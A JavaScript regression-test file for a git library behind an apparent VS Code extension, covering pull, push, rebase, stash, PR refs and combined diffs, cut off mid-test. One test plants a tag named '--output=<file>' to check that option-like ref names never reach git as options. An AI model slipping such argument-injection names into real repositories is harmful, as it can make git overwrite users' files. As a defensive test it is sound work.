'use strict';

/**
 * Regression tests for bugs found in review, run against real repositories.
 */

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const { execFileSync } = require('child_process');
const { createRepo, makeTempDir } = require('./helpers/repo');
const { Repository, INDEX } = require('../src/git/repository');
const { parseTodo } = require('../src/git/rebaseTodo');

/** Load a VS Code-layer module with the in-memory vscode mock installed. */
function requireWithVscode(mod) {
  const { createVscode, installVscodeMock } = require('./helpers/vscodeMock');
  if (!requireWithVscode.installed) {
    installVscodeMock(createVscode());
    requireWithVscode.installed = true;
  }
  return require(mod);
}

async function setup(t) {
  const r = createRepo();
  t.after(() => r.cleanup());
  return { r, repo: await Repository.open(r.dir) };
}

/** A bare "origin" plus a second clone that can push to it (the "other developer"). */
function withRemote(t, r) {
  const remoteDir = makeTempDir('cc-remote-');
  const otherDir = makeTempDir('cc-other-');
  t.after(() => {
    fs.rmSync(remoteDir, { recursive: true, force: true });
    fs.rmSync(otherDir, { recursive: true, force: true });
  });
  r.git('init', '-q', '--bare', remoteDir);
  r.git('remote', 'add', 'origin', remoteDir);
  r.git('push', '-q', '-u', 'origin', 'main');
  execFileSync('git', ['clone', '-q', remoteDir, otherDir]);
  const other = (...args) => execFileSync('git', args, { cwd: otherDir, encoding: 'utf8' }).trim();
  const otherCommit = (msg, file, content) => {
    fs.writeFileSync(path.join(otherDir, file), content);
    other('add', '-A');
    other('commit', '-q', '-m', msg);
  };
  return { remoteDir, other, otherCommit };
}

test('commit messages keep lines starting with #', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('init', { 'a.txt': '1\n' });
  r.write('a.txt', '2\n');
  await repo.stage(['a.txt']);
  await repo.commit('#42 fix crash\n\n## Details\nbody');
  assert.equal(r.git('log', '-1', '--format=%B'), '#42 fix crash\n\n## Details\nbody');
});

test('pull with diverged branches merges (git >= 2.33 would otherwise refuse)', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const { otherCommit, other } = withRemote(t, r);
  otherCommit('remote work', 'remote.txt', 'r\n');
  other('push', '-q');
  r.commit('local work', { 'local.txt': 'l\n' });
  await repo.pull();
  assert.ok(fs.existsSync(path.join(r.dir, 'remote.txt')));
  assert.equal(r.git('log', '-1', '--format=%p').split(' ').length, 2, 'a merge commit was created');
});

test('pull honours pull.rebase=true from git config', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const { otherCommit, other } = withRemote(t, r);
  otherCommit('remote work', 'remote.txt', 'r\n');
  other('push', '-q');
  r.commit('local work', { 'local.txt': 'l\n' });
  r.git('config', 'pull.rebase', 'true');
  await repo.pull();
  assert.equal(r.git('log', '-1', '--format=%s'), 'local work');
  assert.equal(r.git('log', '-1', '--format=%p').split(' ').length, 1, 'history stayed linear');
});

test('push works when the local branch name differs from its upstream', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const { remoteDir } = withRemote(t, r);
  await repo.checkoutTracking('origin/main', 'main-2');
  r.commit('on main-2', { 'b.txt': 'b\n' });
  // Like push.default=simple, the target must be explicit when the names differ.
  await assert.rejects(repo.push(), (e) => e.code === 'UpstreamNameMismatch');
  await repo.push({ to: 'upstream' });
  assert.equal(execFileSync('git', ['log', '-1', '--format=%s', 'main'], { cwd: remoteDir, encoding: 'utf8' }).trim(), 'on main-2');
});

test('network operations do not block local writes', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  // A remote whose transport hangs for 2 seconds.
  r.git('remote', 'add', 'slow', 'ssh://example.invalid/repo.git');
  r.git('config', 'core.sshCommand', 'sleep 2; false');
  const fetching = repo.fetch({ remote: 'slow' }).catch(() => 'failed');
  await new Promise((res) => setTimeout(res, 100));
  r.write('a.txt', '2\n');
  const started = Date.now();
  await repo.stage(['a.txt']);
  assert.ok(Date.now() - started < 1500, `stage waited ${Date.now() - started} ms for the fetch`);
  assert.equal(await fetching, 'failed');
});

test('PR diff uses GitHub\'s base tip even when the local base branch is stale', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'f.txt': '1\n' });
  const { remoteDir, other, otherCommit } = withRemote(t, r);
  // main moves on remotely; our origin/main stays stale.
  otherCommit('main 1', 'm1.txt', '1\n');
  otherCommit('main 2', 'm2.txt', '2\n');
  other('push', '-q');
  // PR branch on top of the newest main, plus a test-merge ref like GitHub publishes.
  other('checkout', '-q', '-b', 'pr');
  otherCommit('pr work', 'pr.txt', 'p\n');
  const head = other('rev-parse', 'HEAD');
  other('push', '-q', 'origin', `${head}:refs/pull/5/head`);
  other('checkout', '-q', 'main');
  other('merge', '-q', '--no-ff', '-m', 'test merge', 'pr');
  other('push', '-q', 'origin', 'HEAD:refs/pull/5/merge');
  other('reset', '-q', '--hard', 'HEAD~1');
  void remoteDir;
  const sha = await repo.fetchPullRequest('origin', 5, { withMerge: true });
  const { mergeBase } = await repo.resolvePullRequestBase('origin', 5, sha);
  const files = await repo.diffFiles(mergeBase, sha);
  assert.deepEqual(files.map((f) => f.path), ['pr.txt']);
});

test('checked-out PR branches track refs/pull/<n>/head and pull new commits', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'f.txt': '1\n' });
  const { other, otherCommit } = withRemote(t, r);
  other('checkout', '-q', '-b', 'pr');
  otherCommit('pr 1', 'p1.txt', '1\n');
  other('push', '-q', 'origin', 'HEAD:refs/pull/9/head');
  const sha = await repo.fetchPullRequest('origin', 9);
  await repo.checkoutPullRequest('origin', 9, 'pr/9', sha);
  otherCommit('pr 2', 'p2.txt', '2\n');
  other('push', '-q', '-f', 'origin', 'HEAD:refs/pull/9/head');
  await repo.pull();
  assert.equal(r.git('log', '-1', '--format=%s'), 'pr 2');
});

test('paths containing [ ] are taken literally, not as globs', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('init', { 'pages/[id].tsx': 'a\n', 'pages/i.tsx': 'b\n' });
  r.write('pages/[id].tsx', 'a2\n');
  r.write('pages/i.tsx', 'b2\n');
  await repo.stage(['pages/[id].tsx']);
  const s = await repo.refreshState();
  assert.deepEqual(s.staged.map((e) => e.path), ['pages/[id].tsx']);
});

test('a workspace opened through a symlink maps paths onto the repository', async (t) => {
  const { r } = await setup(t);
  r.commit('init', { 'src/a.txt': '1\n' });
  const linkParent = makeTempDir('cc-link-');
  t.after(() => fs.rmSync(linkParent, { recursive: true, force: true }));
  const link = path.join(linkParent, 'link');
  fs.symlinkSync(r.dir, link);
  const repo = await Repository.open(path.join(link, 'src'));
  assert.equal(repo.root, r.dir);
  assert.equal(repo.displayRoot, link);
  const fileViaLink = path.join(link, 'src', 'a.txt');
  assert.ok(repo.contains(fileViaLink));
  assert.equal(repo.relative(fileViaLink), 'src/a.txt');
  assert.equal(repo.absolute('src/a.txt'), fileViaLink);
});

test('stash apply falls back when the staged state cannot be restored, and conflicts can be undone', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('init', { 'a.txt': '1\n' });
  r.write('a.txt', 'stashed\n');
  await repo.stashPush({ message: 'x' });
  r.commit('conflicting', { 'a.txt': 'committed\n' });
  await assert.rejects(repo.stashApply('stash@{0}', false), (e) => e.code === 'Conflict');
  assert.equal((await repo.getStashes()).length, 1, 'the stash is kept');
  await repo.abortOperation('stash');
  assert.equal(r.read('a.txt'), 'committed\n');
});

test('interactive rebase keeps git in charge of which commits are rebased', async (t) => {
  const { r, repo } = await setup(t);
  const base = r.commit('base', { 'f.txt': '' });
  const a = r.commit('a', { 'a.txt': 'a\n' });
  const b = r.commit('b', { 'b.txt': 'b\n' });
  // A plan that mentions a commit git will not include (an unrelated SHA): it must be ignored, not crash.
  const bogus = 'f'.repeat(40);
  const { entries } = parseTodo(`pick ${b} b\npick ${bogus} bogus\npick ${a} a\n`);
  await repo.rebaseInteractive(base, entries);
  assert.deepEqual(r.git('log', '--format=%s', '-3').split('\n'), ['a', 'b', 'base']);
});

test('bisect finds the first bad commit', async (t) => {
  const { r, repo } = await setup(t);
  const good = r.commit('good', { 'v.txt': 'ok\n' });
  r.commit('still good', { 'w.txt': '1\n' });
  const culprit = r.commit('introduce bug', { 'v.txt': 'BUG\n' });
  r.commit('later', { 'x.txt': '1\n' });
  await repo.bisectStart('HEAD', good);
  let result;
  for (let i = 0; i < 5; i++) {
    const bad = r.read('v.txt').includes('BUG');
    result = await repo.bisectMark(bad ? 'bad' : 'good');
    if (result.done) break;
  }
  assert.equal(result.culprit, culprit);
  await repo.bisectReset();
  assert.equal((await repo.refreshState()).operation, undefined);
});

test('patches: format-patch series apply as commits elsewhere; working-tree diffs apply too', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('init', { 'a.txt': '1\n' });
  r.git('checkout', '-q', '-b', 'feature');
  const c1 = r.commit('feature 1', { 'b.txt': 'b\n' });
  const c2 = r.commit('feature 2', { 'c.txt': 'c\n' });
  const patch = await repo.formatPatch([c2, c1]);
  r.git('checkout', '-q', 'main');
  await repo.applyPatch(patch, true);
  assert.deepEqual(r.git('log', '--format=%s', '-2').split('\n'), ['feature 2', 'feature 1']);
  r.write('a.txt', 'changed\n');
  const diff = await repo.diffPatch('unstaged');
  r.git('checkout', '-q', '--', 'a.txt');
  await repo.applyPatch(diff, false);
  assert.equal(r.read('a.txt'), 'changed\n');
});

test('line history reports the path a file had in each commit', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('add', { 'old.txt': 'a\nb\n' });
  r.commit('edit', { 'old.txt': 'a\nB\n' });
  r.git('mv', 'old.txt', 'new.txt');
  r.commit('rename');
  r.commit('edit again', { 'new.txt': 'a\nB2\n' });
  const hist = await repo.lineHistory('new.txt', 2, 2);
  assert.deepEqual(hist.map((c) => [c.subject, c.change.path]), [['edit again', 'new.txt'], ['edit', 'old.txt'], ['add', 'old.txt']]);
});

test('index edits keep CRLF/BOM handling to the editor layer: blobs round-trip byte-exact', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('init', { 'a.txt': '﻿l1\r\nl2\r\n' });
  const text = await repo.showText(INDEX, 'a.txt');
  await repo.writeIndexContent('a.txt', text);
  assert.equal(r.git('status', '--porcelain'), '');
});

test('hooks see the user\'s environment: glob pathspecs in a pre-commit hook still work', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('init', { 'a.txt': '1\n' });
  const out = path.join(r.dir, '.git', 'hook-out');
  const hook = path.join(r.dir, '.git', 'hooks', 'pre-commit');
  fs.writeFileSync(hook, `#!/bin/sh\ngit diff --cached --name-only -- '*.txt' > "${out}"\necho "LC_ALL=$LC_ALL" >> "${out}"\n`, { mode: 0o755 });
  r.write('a.txt', '2\n');
  await repo.stage(['a.txt']);
  await repo.commit('change');
  const lines = fs.readFileSync(out, 'utf8').split('\n');
  assert.equal(lines[0], 'a.txt');
  assert.notEqual(lines[1], 'LC_ALL=C');
});

test('the rebase sequence editor aborts instead of dropping commits missing from the plan', async (t) => {
  const { r, repo } = await setup(t);
  const base = r.commit('base', { 'f.txt': '' });
  const a = r.commit('a', { 'a.txt': 'a\n' });
  r.commit('b', { 'b.txt': 'b\n' });
  const head = r.git('rev-parse', 'HEAD');
  const { entries } = parseTodo(`pick ${a} a\n`); // plan forgot "b"
  await assert.rejects(repo.rebaseInteractive(base, entries));
  assert.equal(r.git('rev-parse', 'HEAD'), head, 'history untouched');
  assert.equal((await repo.refreshState()).operation, undefined);
});

test('accept theirs on a modify/delete conflict resolves to the deletion', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'f.txt': 'base\n', 'keep.txt': 'k\n' });
  r.git('checkout', '-q', '-b', 'topic');
  r.git('rm', '-q', 'f.txt');
  r.commit('delete f');
  r.git('checkout', '-q', 'main');
  r.commit('modify f', { 'f.txt': 'changed\n' });
  await assert.rejects(repo.merge('topic'));
  await repo.resolveWith('f.txt', 'theirs');
  const s = await repo.refreshState();
  assert.equal(s.conflicts.length, 0);
  assert.ok(!fs.existsSync(path.join(r.dir, 'f.txt')));
});

test('pushing a checked-out PR branch is refused with a clear error', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'f.txt': '1\n' });
  const { other, otherCommit } = withRemote(t, r);
  other('checkout', '-q', '-b', 'pr');
  otherCommit('pr 1', 'p1.txt', '1\n');
  other('push', '-q', 'origin', 'HEAD:refs/pull/3/head');
  const sha = await repo.fetchPullRequest('origin', 3);
  await repo.checkoutPullRequest('origin', 3, 'pr/3', sha);
  r.commit('fix', { 'x.txt': 'x\n' });
  await assert.rejects(repo.push(), (e) => e.code === 'PullRequestUpstream');
});

test('completing a conflicted merge without a message drops git\'s comment lines', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'f.txt': 'base\n' });
  r.git('checkout', '-q', '-b', 'topic');
  r.commit('topic', { 'f.txt': 'topic\n' });
  r.git('checkout', '-q', 'main');
  r.commit('main', { 'f.txt': 'main\n' });
  await assert.rejects(repo.merge('topic'));
  await repo.resolveWith('f.txt', 'theirs');
  await repo.continueOperation('merge');
  assert.ok(!/^#/m.test(r.git('log', '-1', '--format=%B')));
});

test('a commit at an edit stop of a rebase is recognised as such', async (t) => {
  const { r, repo } = await setup(t);
  const base = r.commit('base', { 'f.txt': '' });
  const a = r.commit('a', { 'a.txt': 'a\n' });
  const { entries } = parseTodo(`edit ${a} a\n`);
  await repo.rebaseInteractive(base, entries).catch(() => {});
  assert.equal((await repo.refreshState()).operation.kind, 'rebase');
  assert.equal(await repo.isRebaseEditStop(), true);
  r.write('n.txt', 'n\n');
  await repo.stage(['n.txt']);
  await repo.commit('separate commit');
  await repo.continueOperation('rebase');
  assert.deepEqual(r.git('log', '--format=%s', '-3').split('\n'), ['separate commit', 'a', 'base']);
});

test('commit --only commits just the selected files and keeps other staged changes staged', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('init', { 'a.txt': '1\n', 'b.txt': '1\n' });
  r.write('a.txt', '2\n');
  r.write('b.txt', '2\n');
  await repo.stage(['b.txt']);
  await repo.commit('only a', { only: ['a.txt'] });
  assert.equal(r.git('show', '--name-only', '--format=', 'HEAD'), 'a.txt');
  assert.equal(r.git('diff', '--cached', '--name-only'), 'b.txt');
});

test('a ref named like an option is never passed to git as an option', async (t) => {
  const { r, repo } = await setup(t);
  const sha = r.commit('init', { 'a.txt': '1\n' });
  const victim = path.join(makeTempDir('cc-victim-'), 'important.txt');
  t.after(() => fs.rmSync(path.dirname(victim), { recursive: true, force: true }));
  fs.writeFileSync(victim, 'IMPORTANT DATA');
  // Such a tag arrives with an ordinary fetch; create it directly here.
  r.git('update-ref', `refs/tags/--output=${victim}`, sha);
  const tag = (await repo.getRefs()).find((x) => x.type === 'tag');
  assert.equal(tag.rev, `refs/tags/--output=${victim}`, 'the full name is used for git');
  await repo.diffFiles(tag.rev);
  await assert.rejects(repo.diffFiles(tag.name), /looks like an option/);
  await assert.rejects(repo.log({ revs: [tag.name] }), /looks like an option/);
  assert.equal(fs.readFileSync(victim, 'utf8'), 'IMPORTANT DATA');
});

test('large path lists go through stdin, and an empty list stages nothing', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('init', { 'keep.txt': '1\n' });
  const files = Array.from({ length: 600 }, (_, i) => `dir/[${i}] file ${i}.txt`);
  for (const f of files) r.write(f, 'x\n');
  r.write('other.txt', 'untracked\n');
  await repo.stage([]);
  assert.equal(r.git('diff', '--cached', '--name-only'), '', 'empty list staged nothing');
  await repo.stage(files);
  let s = await repo.refreshState();
  assert.equal(s.staged.length, 600);
  assert.deepEqual(s.untracked.map((e) => e.path), ['other.txt']);
  await repo.unstage(files);
  s = await repo.refreshState();
  assert.equal(s.staged.length, 0);
  await repo.stashPush({ paths: files.slice(0, 300), includeUntracked: true });
  assert.equal((await repo.getStashes()).length, 1);
});

test('fixup into a commit before a merge is refused without leaving a fixup commit', async (t) => {
  const { r, repo } = await setup(t);
  const target = r.commit('target', { 'a.txt': '1\n' });
  r.git('checkout', '-q', '-b', 'side');
  r.commit('side', { 's.txt': 's\n' });
  r.git('checkout', '-q', 'main');
  r.commit('main', { 'm.txt': 'm\n' });
  r.git('merge', '-q', '--no-ff', '-m', 'merge side', 'side');
  const head = r.git('rev-parse', 'HEAD');
  r.write('a.txt', '2\n');
  await repo.stage(['a.txt']);
  await assert.rejects(repo.fixupInto(target), /merge commits/);
  assert.equal(r.git('rev-parse', 'HEAD'), head);
  assert.equal(r.git('diff', '--cached', '--name-only'), 'a.txt', 'staged changes untouched');
});

test('undoing a merge commit is refused instead of silently dropping the second parent', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  r.git('checkout', '-q', '-b', 'side');
  r.commit('side', { 's.txt': 's\n' });
  r.git('checkout', '-q', 'main');
  r.commit('main', { 'm.txt': 'm\n' });
  r.git('merge', '-q', '--no-ff', '-m', 'merge', 'side');
  await assert.rejects(repo.undoLastCommit(), /merge/);
});

test('error classification: credential problems are not reported as network problems', () => {
  const { classify } = require('../src/git/exec');
  assert.equal(classify('git@github.com: Permission denied (publickey).\nfatal: Could not read from remote repository.', 128), 'AuthenticationFailed');
  assert.equal(classify("fatal: unable to access 'https://github.com/o/r/': The requested URL returned error: 403", 128), 'AuthenticationFailed');
  assert.equal(classify("fatal: unable to access 'https://x/': Could not resolve host: x", 128), 'NetworkError');
});

test('blob reads at fixed revisions go through one batch process and handle misses and binaries', async (t) => {
  const { r, repo } = await setup(t);
  const bin = Buffer.from(Array.from({ length: 70000 }, (_, i) => i % 256));
  r.write('a.txt', 'one\n');
  fs.writeFileSync(path.join(r.dir, 'bin.dat'), bin);
  const c1 = r.commit('one');
  const c2 = r.commit('two', { 'a.txt': 'two\n' });
  const results = await Promise.all([
    repo.showText(c1, 'a.txt'),
    repo.showText(c2, 'a.txt'),
    repo.showText(c2, 'missing.txt'),
    repo.show(c2, 'bin.dat'),
    repo.showText(`${c2}^`, 'a.txt'),
    repo.showText(c2, 'dir-that-is-not-a-file'),
  ]);
  assert.deepEqual(results.slice(0, 3), ['one\n', 'two\n', null]);
  assert.ok(results[3].equals(bin));
  assert.equal(results[4], 'one\n');
  assert.equal(results[5], null);
  assert.ok(repo.blobs && repo.blobs.proc, 'batch process in use');
  repo.dispose();
});


test('a branch created from origin/main does not track it and never pushes onto main', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'f.txt': '1\n' });
  const { remoteDir } = withRemote(t, r);
  r.git('fetch', '-q', 'origin');
  await repo.createBranch('feature-x', 'origin/main', true);
  assert.equal(r.git('config', '--default', '', 'branch.feature-x.merge'), '', 'no upstream was set');
  r.commit('feature work', { 'x.txt': 'x\n' });
  // Same name from a remote branch still tracks.
  await repo.createBranch('main-copy', 'origin/main', false);
  await repo.createBranch('main', 'origin/main', false).catch(() => {}); // exists already
  await repo.push({ remote: 'origin', refspec: 'feature-x', setUpstream: true });
  const remoteMain = execFileSync('git', ['log', '-1', '--format=%s', 'main'], { cwd: remoteDir, encoding: 'utf8' }).trim();
  assert.equal(remoteMain, 'base', 'origin/main untouched');
  // And with a mismatched upstream configured by hand, a plain push refuses.
  r.git('branch', '--set-upstream-to=origin/main', 'feature-x');
  await assert.rejects(repo.push(), (e) => e.code === 'UpstreamNameMismatch');
});

test('the batch blob reader handles large blobs in linear time', async (t) => {
  const { r, repo } = await setup(t);
  const big = Buffer.alloc(30 * 1024 * 1024, 7);
  fs.writeFileSync(path.join(r.dir, 'big.bin'), big);
  const sha = r.commit('big');
  const started = Date.now();
  const [a, b] = await Promise.all([repo.show(sha, 'big.bin'), repo.showText(sha, 'missing')]);
  assert.ok(Date.now() - started < 3000, `took ${Date.now() - started} ms`);
  assert.equal(a.length, big.length);
  assert.equal(b, null);
  repo.dispose();
});

test('commitStagedPaths commits only the staged state of the given files', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('init', { 'a.txt': '1\n2\n', 'b.txt': 'b\n' });
  r.write('a.txt', '1 staged\n2\n');
  await repo.stage(['a.txt']);
  r.write('a.txt', '1 staged\n2 unstaged\n'); // partially staged
  r.write('b.txt', 'b staged\n');
  await repo.stage(['b.txt']);
  await repo.commitStagedPaths('only a, staged part', ['a.txt']);
  assert.equal(r.git('show', 'HEAD:a.txt'), '1 staged\n2');
  assert.equal(r.git('show', 'HEAD:b.txt'), 'b', 'b not committed');
  assert.equal(r.git('diff', '--cached', '--name-only'), 'b.txt', 'b still staged');
  assert.equal(r.read('a.txt'), '1 staged\n2 unstaged\n', 'working tree untouched');
});

test('combined diff of non-adjacent commits contains exactly the selected changes', async (t) => {
  const { r, repo } = await setup(t);
  const pad = (lines) => lines.join('\n1\n2\n3\n4\n') + '\n';
  r.commit('base', { 'b.txt': pad(['top', 'middle', 'bottom']), 'a.txt': 'x\n' });
  const s1 = r.commit('s1', { 'b.txt': pad(['TOP', 'middle', 'bottom']) });
  r.commit('s2 (not selected)', { 'b.txt': pad(['TOP', 'MIDDLE', 'bottom']) });
  r.git('mv', 'a.txt', 'renamed.txt');
  r.commit('rename (not selected)');
  const s3 = r.commit('s3', { 'b.txt': pad(['TOP', 'MIDDLE', 'BOTTOM']) });
  const { files, exact } = await repo.getMultiCommitChanges([s3, s1]);
  assert.equal(exact, true);
  assert.deepEqual(files.map((f) => f.path), ['b.txt'], 'the unselected rename does not appear');
  const b = files[0];
  assert.equal(await repo.showText(b.afterRef, 'b.txt'), pad(['TOP', 'middle', 'BOTTOM']), "s2's edit is not included");
  repo.dispose();
});

test('combined diff falls back (and says so) when a selected commit depends on an unselected one', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'f.txt': '1\n' });
  const s1 = r.commit('s1', { 'g.txt': 'g\n' });
  r.commit('unselected', { 'f.txt': '2\n' });
  const s3 = r.commit('s3 builds on it', { 'f.txt': '3\n' });
  const res = await repo.getMultiCommitChanges([s1, s3]);
  assert.equal(res.exact, false);
  assert.deepEqual(res.failed, [s3]);
  assert.ok(res.files.some((f) => f.path === 'f.txt'));
});

test('submodule changes are shown as "Subproject commit" text on both sides', async (t) => {
  const { r, repo } = await setup(t);
  const sub = createRepo();
  t.after(() => sub.cleanup());
  const s1 = sub.commit('sub 1', { 's.txt': '1\n' });
  r.commit('base', { 'f.txt': '1\n' });
  execFileSync('git', ['-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', sub.dir, 'mod'], { cwd: r.dir });
  r.commit('add submodule');
  const s2 = sub.commit('sub 2', { 's.txt': '2\n' });
  execFileSync('git', ['fetch', '-q'], { cwd: path.join(r.dir, 'mod') });
  execFileSync('git', ['checkout', '-q', s2], { cwd: path.join(r.dir, 'mod') });
  assert.equal(await repo.showText('HEAD', 'mod'), `Subproject commit ${s1}\n`);
  assert.equal(await repo.showText(INDEX, 'mod'), `Subproject commit ${s1}\n`);
  assert.equal(await repo.showText(require('../src/git/repository').WORKTREE, 'mod'), `Subproject commit ${s2}\n`);
  assert.equal(await repo.showText(r.git('rev-parse', 'HEAD'), 'mod'), `Subproject commit ${s1}\n`);
  repo.dispose();
});

test('rewording runs the commit-msg hook but not pre-commit', async (t) => {
  const { r, repo } = await setup(t);
  const base = r.commit('base', { 'f.txt': '' });
  const a = r.commit('a', { 'a.txt': 'a\n' });
  const hooks = path.join(r.dir, '.git', 'hooks');
  fs.writeFileSync(path.join(hooks, 'pre-commit'), '#!/bin/sh\nexit 1\n', { mode: 0o755 });
  fs.writeFileSync(path.join(hooks, 'commit-msg'), '#!/bin/sh\necho "Signed-by-hook: yes" >> "$1"\n', { mode: 0o755 });
  const { entries } = parseTodo(`pick ${a} a\n`);
  await repo.rebaseInteractive(base, entries, new Map([[0, 'a reworded\n']]));
  assert.equal(r.git('log', '-1', '--format=%B'), 'a reworded\nSigned-by-hook: yes');
});

test('option-like names are deleted as names', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('init', { 'f.txt': '1\n' });
  r.git('update-ref', 'refs/tags/--x', 'HEAD');
  r.git('update-ref', 'refs/heads/--y', 'HEAD');
  await repo.deleteTag('refs/tags/--x');
  await repo.deleteBranch('--y', true);
  assert.equal(r.git('for-each-ref', 'refs/tags/--x', 'refs/heads/--y'), '');
});

test('index reads of a path that looks like a stage spec ("1:foo")', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('init', { '1:foo': 'colon\n', foo: 'plain\n' });
  assert.equal(await repo.showText(INDEX, '1:foo'), 'colon\n');
});

// ---------------------------------------------------------------------------
test('combined diff stays exact with diff.noprefix and textconv in the user config', async (t) => {
  const { r, repo } = await setup(t);
  const pad = (lines) => lines.join('\n1\n2\n3\n4\n') + '\n';
  r.commit('base', { 'b.txt': pad(['top', 'middle', 'bottom']) });
  const s1 = r.commit('s1', { 'b.txt': pad(['TOP', 'middle', 'bottom']) });
  r.commit('unselected', { 'b.txt': pad(['TOP', 'MIDDLE', 'bottom']) });
  const s3 = r.commit('s3', { 'b.txt': pad(['TOP', 'MIDDLE', 'BOTTOM']) });
  r.git('config', 'diff.noprefix', 'true');
  r.git('config', 'diff.mnemonicPrefix', 'true');
  r.git('config', 'diff.upper.textconv', 'tr a-z A-Z');
  fs.writeFileSync(path.join(r.dir, '.git', 'info', 'attributes'), '*.txt diff=upper\n');
  const res = await repo.getMultiCommitChanges([s3, s1]);
  assert.equal(res.exact, true, `failed: ${res.failed}`);
  assert.equal(await repo.showText(res.files[0].afterRef, 'b.txt'), pad(['TOP', 'middle', 'BOTTOM']));
  const patch = await repo.formatPatch([s1]);
  assert.match(patch, /^diff --git a\/b\.txt b\/b\.txt$/m, 'patches always use a/ b/ prefixes');
  r.write('b.txt', 'changed\n');
  assert.match(await repo.diffPatch('all'), /^--- a\/b\.txt$/m);
  assert.doesNotMatch(await repo.diffPatch('all'), /CHANGED/, 'no textconv in patches');
  repo.dispose();
});

test('an unbroken chain of selected commits is combined without replaying', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const c1 = r.commit('c1', { 'a.txt': '2\n' });
  const c2 = r.commit('c2', { 'b.txt': 'b\n' });
  const res = await repo.getMultiCommitChanges([c2, c1]);
  assert.equal(res.exact, true);
  assert.equal(res.tree, r.git('rev-parse', `${c2}^{tree}`));
  assert.deepEqual(res.files.map((f) => f.path).sort(), ['a.txt', 'b.txt']);
  repo.dispose();
});

test('a combined diff nobody waits for any more can be cancelled', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const c1 = r.commit('c1', { 'a.txt': '2\n' });
  r.commit('gap', { 'g.txt': 'g\n' });
  const c3 = r.commit('c3', { 'b.txt': 'b\n' });
  const controller = new AbortController();
  controller.abort();
  await assert.rejects(repo.getMultiCommitChanges([c1, c3], { signal: controller.signal }), (e) => e.code === 'Cancelled');
  repo.dispose();
});

test('line staging keeps CRLF lines of the index with core.autocrlf=input', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('crlf', { 'w.txt': 'l1\r\nl2\r\nl3\r\nl4\r\n' });
  r.git('config', 'core.autocrlf', 'input');
  await repo.writeIndexContent('w.txt', 'l1\r\nL2\r\nl3\r\nl4\r\n', undefined, { asIs: true });
  assert.equal(r.git('diff', '--cached', '--numstat'), '1\t1\tw.txt', 'only the edited line changes');
  repo.dispose();
});

test('Commit Selected commits a symlink from the working tree as a symlink', { skip: process.platform === 'win32' }, async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': 'a\n', 'b.txt': 'b\n' });
  fs.symlinkSync('a.txt', path.join(r.dir, 'link'));
  r.git('add', 'link');
  r.git('commit', '-q', '-m', 'link');
  r.write('a.txt', 'staged a\n');
  r.git('add', 'a.txt');
  fs.unlinkSync(path.join(r.dir, 'link'));
  fs.symlinkSync('b.txt', path.join(r.dir, 'link'));
  await repo.commitStagedPaths('both', ['a.txt', 'link'], { workingTreePaths: ['link'] });
  assert.match(r.git('ls-tree', 'HEAD', 'link'), /^120000 blob /);
  assert.equal(r.git('cat-file', 'blob', 'HEAD:link'), 'b.txt');
  assert.equal(r.git('status', '--porcelain'), '');
  repo.dispose();
});

test('fetch leaves pruning to remote.<name>.prune when it is set', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const { other } = withRemote(t, r);
  other('push', '-q', 'origin', 'HEAD:refs/heads/stale');
  await repo.fetch({ remote: 'origin' });
  other('push', '-q', 'origin', ':stale');
  r.git('config', 'remote.origin.prune', 'false');
  await repo.fetch({ remote: 'origin' });
  assert.ok(r.git('branch', '-r').includes('origin/stale'), 'kept, as configured');
  r.git('config', '--unset', 'remote.origin.prune');
  await repo.fetch({ remote: 'origin' });
  assert.ok(!r.git('branch', '-r').includes('origin/stale'), 'pruned by default');
  repo.dispose();
});

test('pull.rebase and pull.ff accept every boolean spelling', () => {
  const { parseRebaseConfig } = require('../src/git/repository');
  for (const v of ['false', 'no', 'off', '0', 'FALSE', undefined]) assert.equal(parseRebaseConfig(v), false, String(v));
  for (const v of ['true', 'yes', 'on', '1', 'interactive', 'i']) assert.equal(parseRebaseConfig(v), true, v);
  assert.equal(parseRebaseConfig('merges'), 'merges');
});

test('pull.rebase=no merges instead of rebasing', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const { otherCommit, other } = withRemote(t, r);
  otherCommit('remote work', 'remote.txt', 'r\n');
  other('push', '-q');
  r.commit('local work', { 'local.txt': 'l\n' });
  r.git('config', 'pull.rebase', 'no');
  await repo.pull();
  assert.equal(r.git('log', '-1', '--format=%p').split(' ').length, 2, 'a merge commit');
  repo.dispose();
});

test('push.default=nothing refuses to guess the target', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  withRemote(t, r);
  r.git('checkout', '-q', '-b', 'topic', '--track', 'origin/main');
